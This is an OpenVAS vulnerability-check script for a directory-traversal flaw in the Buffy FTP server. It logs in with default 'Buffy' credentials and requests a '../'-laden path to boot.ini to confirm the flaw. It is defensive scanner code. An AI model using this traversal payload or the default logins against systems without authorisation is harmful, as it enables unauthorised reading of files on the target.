###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_buffy_44577.nasl 14 2013-10-27 12:33:37Z jan $
#
# Buffy 'comb' Command Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Buffy is prone to a directory-traversal vulnerability because it fails
to sufficiently sanitize user-supplied input.

An attacker can exploit this vulnerability to download and delete
local files in the context of the webserver process which may aid in
further attacks.

Buffy 1.3 is vulnerable; prior versions may also be affected.";


if (description)
{
 script_id(100886);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-11-02 13:46:58 +0100 (Tue, 02 Nov 2010)");
 script_bugtraq_id(44577);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_name("Buffy 'comb' Command Directory Traversal Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44577");
 script_xref(name : "URL" , value : "http://www.smotricz.com/opensource/buffy/Buffy.zip");

 script_description(desc);
 script_summary("Determine if Buffy is prone to a directory-traversal vulnerability");
 script_category(ACT_ATTACK);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port){
  port = 21;
}

if(get_kb_item('ftp/'+port+'/broken'))exit(0);

if(!get_port_state(port)){
  exit(0);
}

banner = get_ftp_banner(port:port);
if("Buffy" >!< banner)exit(0);

soc1 = open_sock_tcp(port);
if(!soc1){
  exit(0);
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "Buffy";
if(!pass)pass = string("Buffy");

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{ 
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2) {
      file = "../../../../../../../../../../../../../../../../boot.ini";
      attackreq = string("RETR ", file);
      send(socket:soc1, data:string(attackreq, "\r\n"));
      attackres = ftp_recv_data(socket:soc2);
      close(soc2);
    }
  }

  if(attackres && egrep(pattern:"\[boot loader\]" , string: attackres)) {
   security_warning(port:port);
   ftp_close(socket:soc1);
   close(soc1);
   exit(0);
  }

 ftp_close(socket:soc1);
 close(soc1);
 exit(0);
}

exit(0); 

     
